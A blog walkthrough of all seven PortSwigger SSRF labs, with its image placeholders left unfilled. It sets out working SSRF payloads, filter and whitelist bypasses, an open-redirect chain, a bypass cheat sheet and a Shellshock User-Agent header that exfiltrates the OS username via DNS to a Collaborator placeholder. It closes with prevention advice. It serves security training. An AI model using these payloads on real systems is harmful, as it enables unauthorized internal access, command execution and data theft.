---
title: "PortSwigger SSRF Labs — Complete Walkthrough"
date: 2026-09-22 07:30:00 +0000
categories: [Web Penetration Testing]
tags: [SSRF, PortSwigger, Web Security Academy]
description: "All 7 PortSwigger server-side request forgery labs: basic SSRF, blacklist and whitelist bypasses, open-redirect filter bypass, and blind OAST plus Shellshock exploitation."
author: Paschal Sangawe
toc: true
---

Server-side request forgery (SSRF) is a vulnerability where an attacker can make the *server* send HTTP requests to a destination of their choosing. It is powerful because the server usually sits in a trusted network position: it can reach `localhost`, internal-only services, and cloud metadata endpoints that the internet cannot. Against cloud providers it is frequently the first step to credential theft and full account compromise.

This post covers all **7 PortSwigger SSRF labs**. Most use the same entry point — a "Check stock" feature that takes a `stockApi` URL and fetches it server-side.

## Lab 1 — Basic SSRF against the local server
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://localhost/admin`.
> _Save as_ `images/portswigger-ssrf-labs/1.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Reach the admin interface and delete `carlos`.

Browsing to `/admin` directly is denied, but the stock checker can fetch it from the server's own perspective:

```http
stockApi=http://localhost/admin
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://localhost/admin`.
> _Save as_ `images/portswigger-ssrf-labs/2.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/2.png)`_._


The admin panel HTML is returned. Find the delete link and request it:

```http
stockApi=http://localhost/admin/delete?username=carlos
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://localhost/admin/delete?username=carlos`.
> _Save as_ `images/portswigger-ssrf-labs/3.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/3.png)`_._


> **Picture goes here (#4).** The `stockApi=http://localhost/admin` response rendering the admin panel and the delete request.
> _Save as_ `images/portswigger-ssrf-labs/4.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/4.png)`_._

## Lab 2 — Basic SSRF against another back-end system
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://192.168.0.§1§:8080/admin`.
> _Save as_ `images/portswigger-ssrf-labs/5.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/5.png)`_._


**Difficulty:** Apprentice
**Goal:** Discover an internal host and use it to delete `carlos`.

The admin interface lives on an internal host in the `192.168.0.0/24` range on port `8080`, but we do not know which IP. Send the request to Burp Intruder and treat the last octet as a payload position:

```http
stockApi=http://192.168.0.§1§:8080/admin
```

> **Picture goes here (#6).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://192.168.0.§1§:8080/admin`.
> _Save as_ `images/portswigger-ssrf-labs/6.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/6.png)`_._


Configure the payload as **Numbers, from 1 to 255, step 1**, and start the attack. Sort by status code: exactly one response returns **HTTP 200** with an admin interface. Then switch to the delete path:

```http
stockApi=http://192.168.0.<IP>:8080/admin/delete?username=carlos
```

> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://192.168.0.<IP>:8080/admin/delete?username=carlos`.
> _Save as_ `images/portswigger-ssrf-labs/7.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/7.png)`_._


> **Picture goes here (#8).** Intruder results with a single 200 status revealing the internal admin host.
> _Save as_ `images/portswigger-ssrf-labs/8.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/8.png)`_._

## Lab 3 — SSRF with blacklist-based input filter
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://127.0.0.1/        → blocked`.
> _Save as_ `images/portswigger-ssrf-labs/9.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/9.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass a blacklist blocking `127.0.0.1` and `admin`.

First confirm the block:

```http
stockApi=http://127.0.0.1/        → blocked
```

> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://127.0.0.1/        → blocked`.
> _Save as_ `images/portswigger-ssrf-labs/10.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/10.png)`_._


Bypass the hostname filter with an alternative localhost notation:

```http
stockApi=http://127.1/            → allowed
```

> **Picture goes here (#11).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://127.1/            → allowed`.
> _Save as_ `images/portswigger-ssrf-labs/11.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/11.png)`_._


Then the filter also blocks the string `admin`:

```http
stockApi=http://127.1/admin       → blocked
```

> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://127.1/admin       → blocked`.
> _Save as_ `images/portswigger-ssrf-labs/12.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/12.png)`_._


Obfuscate the `a` with a **double URL-encoding** (`a` → `%61` → `%2561`) so the filter sees no `admin` literal, but the server decodes it back:

```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://127.1/%2561dmin/delete?username=carlos`.
> _Save as_ `images/portswigger-ssrf-labs/13.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/13.png)`_._


> **Other localhost equivalents:** `127.1`, `127.0.0.1`, `2130706433` (decimal), `0177.0.0.1`, `0x7f.0.0.1`, `[::1]`.

> **Picture goes here (#14).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-ssrf-labs/14.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/14.png)`_._

## Lab 4 — SSRF with filter bypass via open redirection
> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`.
> _Save as_ `images/portswigger-ssrf-labs/15.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/15.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass a filter that blocks non-whitelisted hosts by chaining an open redirect.

Here the stock checker will only fetch its own host, so a direct request to the internal admin host fails. However, the "next product" feature reflects a `path` parameter into a `Location` redirect header — an **open redirect** on the same origin.

Because the SSRF fetches the local application, it will follow the redirect to the attacker-chosen host:

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`.
> _Save as_ `images/portswigger-ssrf-labs/16.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/16.png)`_._


Then append the delete action:

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`.
> _Save as_ `images/portswigger-ssrf-labs/17.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/17.png)`_._


> **Picture goes here (#18).** The redirect-based payload and the admin page returned by the stock checker.
> _Save as_ `images/portswigger-ssrf-labs/18.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/18.png)`_._

## Lab 5 — SSRF with whitelist-based input filter
> **Picture goes here (#19).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://127.0.0.1/                       → rejected`.
> _Save as_ `images/portswigger-ssrf-labs/19.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/19.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass a hostname whitelist by abusing URL parsing.

The application parses the URL, extracts the hostname, and checks it against a whitelist. Probing reveals how the parser behaves:

```http
stockApi=http://127.0.0.1/                       → rejected
stockApi=http://username@stock.weliketoshop.net/ → accepted (embedded credentials supported)
stockApi=http://username#@stock.weliketoshop.net/→ rejected (# terminates before host)
stockApi=http://username%2523@stock.weliketoshop.net/ → Internal Server Error (host became "username")
```

> **Picture goes here (#20).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://127.0.0.1/                       → rejected`.
> _Save as_ `images/portswigger-ssrf-labs/20.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/20.png)`_._


Double-URL-encoding the `#` (`%2523`) survives the filter's single decode, then becomes a fragment delimiter at request time, so everything after it (`@stock.weliketoshop.net`) is ignored and the host resolves to `username`. Point "username" at localhost with an explicit port:

```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

> **Picture goes here (#21).** Capture this request/response or command step in Burp/terminal. Key line: `stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`.
> _Save as_ `images/portswigger-ssrf-labs/21.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/21.png)`_._


The whitelist sees `stock.weliketoshop.net`; the actual connection goes to `localhost:80`.

> **Picture goes here (#22).** The whitelist-bypass payload deleting carlos.
> _Save as_ `images/portswigger-ssrf-labs/22.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/22.png)`_._

## Lab 6 — Blind SSRF with out-of-band detection
> **Picture goes here (#23).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Referer`.
> _Save as_ `images/portswigger-ssrf-labs/23.png` _then replace this block with_ `![Lab 6 — Blind SSRF with out-of-band detection](/images/portswigger-ssrf-labs/23.png)`_._


**Difficulty:** Practitioner
**Goal:** Detect a blind SSRF using Burp Collaborator.

Analytics software fetches the URL in the **`Referer`** header when a product page loads, but the response is never returned — a blind SSRF. Use Burp Collaborator as the destination and poll for interactions:

1. Visit a product and intercept the request.
2. Select the `Referer` header value and choose **Insert Collaborator payload**.
3. Send the request, then open the Collaborator tab and click **Poll now**.
4. Observe the DNS and HTTP interactions initiated by the back-end.

> **Community Edition:** Collaborator requires Burp Pro. Use a self-hosted OAST server such as `interactsh` instead.

> **Picture goes here (#24).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-ssrf-labs/24.png` _then replace this block with_ `![Lab 6 — Blind SSRF with out-of-band detection](/images/portswigger-ssrf-labs/24.png)`_._

## Lab 7 — Blind SSRF with Shellshock exploitation
> **Picture goes here (#25).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`.
> _Save as_ `images/portswigger-ssrf-labs/25.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/25.png)`_._


**Difficulty:** Expert
**Goal:** Chain blind SSRF against an internal Bash CGI server (CVE-2014-6271) to exfiltrate the OS username.

The same `Referer`-driven analytics fetch exists, and it forwards the original request's **`User-Agent`**. An internal server at `192.168.0.X:8080` runs a Bash CGI app vulnerable to Shellshock, so we can inject a command via the `User-Agent`.

**Steps**

1. Install the **Collaborator Everywhere** extension and add the lab domain to Burp's target scope.
2. Browse a product page; confirm the `Referer` triggers a Collaborator HTTP interaction and that your `User-Agent` is forwarded.
3. Send the product-page request to Burp Intruder.
4. Generate a Collaborator payload and build the Shellshock header:

```text
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

> **Picture goes here (#26).** Capture this request/response or command step in Burp/terminal. Key line: `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`.
> _Save as_ `images/portswigger-ssrf-labs/26.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/26.png)`_._


5. Set the `User-Agent` to that payload, and set the `Referer` to an internal IP with a payload position on the last octet:

```http
Referer: http://192.168.0.§1§:8080
```

> **Picture goes here (#27).** Capture this request/response or command step in Burp/terminal. Key line: `Referer: http://192.168.0.§1§:8080`.
> _Save as_ `images/portswigger-ssrf-labs/27.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/27.png)`_._


6. Run the Intruder attack over `1–255`. When it completes, poll Collaborator: a DNS interaction appears whose subdomain contains the OS username.

> **Picture goes here (#28).** Collaborator DNS interaction with the username in the subdomain.
> _Save as_ `images/portswigger-ssrf-labs/28.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/28.png)`_._

## SSRF cheat sheet

| Obstacle | Bypass |
|----------|--------|
| Direct access denied | SSRF to `http://localhost/admin` |
| Unknown internal host | Intruder-sweep `192.168.0.0/24` |
| `127.0.0.1` blacklisted | `127.1`, `2130706433`, `[::1]`, `0x7f.0.0.1` |
| Keyword blacklisted (`admin`) | Double-URL-encode a letter (`a` → `%2561`) |
| Host allow-list | Open redirect on the same origin |
| Whitelist host check | Embedded credentials + `%2523` fragment trick |
| No response returned | Blind SSRF via Collaborator/interactsh |
| Internal unpatched host | Shellshock or other OOB RCE payloads |

## Prevention

- Do not accept full URLs from users. If unavoidable, parse and validate scheme (`http`/`https` only), enforce a strict allow-list of hosts, and **re-check after DNS resolution** to stop rebinding.
- Resolve to an IP and block private, loopback and link-local ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`).
- Do not follow redirects, or validate the destination after each hop.
- Segment the network and require authentication between internal services; block IMDS (`169.254.169.254`) from application workloads and require IMDSv2.
- Disable unused schemes/ports and restrict outbound egress to known destinations.

## Related posts

- [OS Command Injection labs](/posts/portswigger-os-command-injection-labs/)
- [Information Disclosure labs](/posts/portswigger-information-disclosure-labs/)
- [File Upload labs](/posts/portswigger-file-upload-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
